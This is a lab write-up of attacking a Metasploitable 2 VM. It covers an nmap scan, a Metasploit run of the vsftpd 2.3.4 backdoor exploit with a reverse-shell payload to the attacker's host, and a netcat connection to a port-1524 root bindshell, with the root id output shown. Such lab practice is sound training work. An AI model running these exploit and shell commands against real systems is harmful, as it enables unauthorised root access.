# metasploitable2-writeups

# Metasploitable 2 — VSFTPD 2.3.4 Backdoor (CVE-2011-2523)

**Target:** 192.168.100.10 (Metasploitable 2 in QEMU)
**Attacker:** Kali Linux (192.168.100.1)
**Date:** 24 September 2026

## Summary

Attempted exploitation of the vsftpd 2.3.4 backdoor using Metasploit.
The exploit triggered but failed to establish a session due to port 6200
being stuck open. Root access was instead obtained via the port 1524
bindshell.

## 1. Reconnaissance

    sudo nmap -sV -Pn 192.168.100.10

Key services:

| Port | Service | Version |
|------|---------|---------|
| 21   | ftp     | vsftpd 2.3.4 |
| 22   | ssh     | OpenSSH 4.7p1 |
| 80   | http    | Apache 2.2.8 |
| 139/445 | smb  | Samba 3.X |
| 1524 | bindshell | Metasploitable root shell |
| 3306 | mysql   | MySQL 5.0.51a |
| 6667 | irc     | UnrealIRCd |

## 2. Vulnerability Identification

    searchsploit ftp vsftpd 2.3.4

Results:

- vsftpd 2.3.4 - Backdoor Command Execution → unix/remote/49757.py
- vsftpd 2.3.4 - Backdoor Command Execution (Metasploit) → unix/remote/17491.rb

**CVE:** CVE-2011-2523

## 3. Exploitation Attempt (Metasploit)

    msfconsole -q
    msf > use exploit/unix/ftp/vsftpd_234_backdoor
    msf > set RHOSTS 192.168.100.10
    msf > set LHOST 192.168.100.1
    msf > set payload cmd/unix/reverse
    msf > run

**Result:** Failed.

    [!] Unable to connect to backdoor on 6200/TCP. Cooldown?
    [-] The port used by the backdoor bind listener is already open/in-use (6200/TCP)

Retried with ForceExploit and cmd/unix/bind_perl — still no session.

## 4. Alternative Access — Port 1524 Bindshell

    nc 192.168.100.10 1524

    root@metasploitable:/# id
    uid=0(root) gid=0(root) groups=0(root)

Root shell obtained.

## 5. Lessons Learned

1. The vsftpd backdoor binds port 6200 — if that port is stuck
   from a previous trigger, the exploit fails. Restart the target
   VM between attempts.
2. Failed exploits are still data — error messages show exactly
   what went wrong.
3. Port 1524 gave root with no exploit at all. Always scan all
   ports; the simplest path is sometimes the easiest.
